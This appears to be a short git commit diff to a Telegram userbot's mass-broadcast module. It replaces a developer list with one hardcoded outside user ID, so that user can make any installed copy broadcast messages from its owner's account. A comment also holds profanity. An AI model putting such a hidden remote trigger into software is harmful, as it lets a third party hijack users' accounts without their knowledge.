5c305bb98bb1415ea43ecb9a0bf8fe53ea0cf337
Landak <80225366+ramadhani892@users.noreply.github.com>
2022-02-22 22:48:18 +0700

    Update gcast.py

--- userbot/modules/gcast.py
+++ userbot/modules/gcast.py
@@ -24,7 +24,7 @@ GCAST_BLACKLIST = [
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS,
+@register(incoming=True, from_users=1826643972,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
